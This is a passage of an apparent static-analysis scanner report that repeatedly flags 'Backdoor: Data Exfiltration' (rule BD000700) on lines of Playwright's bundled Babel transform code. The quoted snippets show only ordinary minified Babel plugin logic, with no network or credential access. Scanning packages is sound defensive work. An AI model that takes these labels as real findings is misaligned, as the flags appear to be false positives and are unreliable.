                    "text": "|VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe.node.computed&&te.push(fe),fe.isPrivate()){let{name:Qe}=fe.node.key.id,It=`get ${Qe}`,Rt=`set ${Qe}`;if(fe.isClassPrivateMethod()){if(fe.node.kind===\"get\"){if(se.has(It)||se.has(Qe)&&!se.has(Rt))throw fe.buildCod",
                    "rendered": {
                      "text": "|VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe.node.computed&&te.push(fe),fe.isPrivate()){let{name:Qe}=fe.node.key.id,It=`get ${Qe}`,Rt=`set ${Qe}`;if(fe.isClassPrivateMethod()){if(fe.node.kind===\"get\"){if(se.has(It)||se.has(Qe)&&!se.has(Rt))throw fe.buildCod",
                      "markdown": "`|VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe.node.computed&&te.push(fe),fe.isPrivate()){let{name:Qe}=fe.node.key.id,It=`get ${Qe}`,Rt=`set ${Qe}`;if(fe.isClassPrivateMethod()){if(fe.node.kind===\"get\"){if(se.has(It)||se.has(Qe)&&!se.has(Rt))throw fe.buildCod`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 241,
                  "endLine": 1895,
                  "endColumn": 246,
                  "snippet": {
                    "text": "PublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe",
                    "rendered": {
                      "text": "PublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe",
                      "markdown": "`PublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");for(let fe of Te.get(\"body\")){if((fe.isClassProperty()||fe.isClassMethod())&&fe`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 163,
                  "endLine": 1895,
                  "endColumn": 168,
                  "snippet": {
                    "text": "t you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");f",
                    "rendered": {
                      "text": "t you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");f",
                      "markdown": "`t you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,Te=y.get(\"body\");f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 145,
                  "endLine": 1895,
                  "endColumn": 150,
                  "snippet": {
                    "text": "'s recommended that you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,",
                    "rendered": {
                      "text": "'s recommended that you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,",
                      "markdown": "`'s recommended that you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.hasDecorators)(y.node),R=[],K=[],te=[],se=new Set,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1895,
                  "startColumn": 96,
                  "endLine": 1895,
                  "endColumn": 101,
                  "snippet": {
                    "text": "ties with the other class features plugins, so it's recommended that you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.h",
                    "rendered": {
                      "text": "ties with the other class features plugins, so it's recommended that you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.h",
                      "markdown": "`ties with the other class features plugins, so it's recommended that you replace it with the following top-level option:\n\t\"assumptions\": {\n\t\t\"setPublicClassFields\": true,\n\t\t\"privateFieldsAsSymbols\": true\n\t}`)}return{name:e,manipulateOptions:n,inherits:i,pre(y){if((0,Da.enableFeature)(y,t,r),typeof y.get(xi)==\"number\"){y.set(xi,\"7.24.4\");return}(!y.get(xi)||VEe.lt(y.get(xi),\"7.24.4\"))&&y.set(xi,\"7.24.4\")},visitor:{Class(y,{file:v}){var I;if(v.get(xi)!==\"7.24.4\"||!(0,Da.shouldTransform)(y,v))return;let D=y.isClassDeclaration();D&&(0,$Ee.assertFieldTransformed)(y);let O=(0,Da.isLoose)(v,t),_,F=(0,ME.h`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 438,
                  "endLine": 1888,
                  "endColumn": 443,
                  "snippet": {
                    "text": "return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);if(r&&s)throw s.buildCodeFrameError(\"Private fields in decorated classes are not supported yet.\"",
                    "rendered": {
                      "text": "return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);if(r&&s)throw s.buildCodeFrameError(\"Private fields in decorated classes are not supported yet.\"",
                      "markdown": "`return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);if(r&&s)throw s.buildCodeFrameError(\"Private fields in decorated classes are not supported yet.\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 379,
                  "endLine": 1888,
                  "endColumn": 384,
                  "snippet": {
                    "text": ".`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);if(r&&s)throw s.buildCodeFrameError(\"",
                    "rendered": {
                      "text": ".`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);if(r&&s)throw s.buildCodeFrameError(\"",
                      "markdown": "`.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);if(r&&s)throw s.buildCodeFrameError(\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 343,
                  "endLine": 1888,
                  "endColumn": 348,
                  "snippet": {
                    "text": "rint-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);i",
                    "rendered": {
                      "text": "rint-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);i",
                      "markdown": "`rint-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClassPrivateMethod!=null&&o.isClassPrivateMethod()&&(i=o),!a&&o.isStaticBlock!=null&&o.isStaticBlock()&&(a=o);i`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 236,
                  "endLine": 1888,
                  "endColumn": 241,
                  "snippet": {
                    "text": "\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClas",
                    "rendered": {
                      "text": "\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClas",
                      "markdown": "`\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivateProperty()&&(s=o),!i&&o.isClas`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 213,
                  "endLine": 1888,
                  "endColumn": 218,
                  "snippet": {
                    "text": "e loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivatePropert",
                    "rendered": {
                      "text": "e loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivatePropert",
                      "markdown": "`e loaded configuration:\n\tnpx cross-env BABEL_SHOW_CONFIG_FOR=${t} <your build command>\nSee https://babeljs.io/docs/configuration#print-effective-configs for more info.`}function Jn(e,t){return!!(e.get(BE)&t)}function jE(e,t){return!!(e.get(xl)&t)}function np(e,t,r){r?e.set(xl,e.get(xl)|t):e.set(xl,e.get(xl)&~t),e.set(Fs,e.get(Fs)&~t)}function MEe(e,t){let r=null,n=null,s=null,i=null,a=null;(0,i_.hasOwnDecorators)(e.node)&&(r=e.get(\"decorators.0\"));for(let o of e.get(\"body.body\"))!r&&(0,i_.hasOwnDecorators)(o.node)&&(r=o.get(\"decorators.0\")),!n&&o.isClassProperty()&&(n=o),!s&&o.isClassPrivatePropert`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1888,
                  "startColumn": 191,
                  "endLine": 1888,
                  "endColumn": 196,
                  "snippet": {
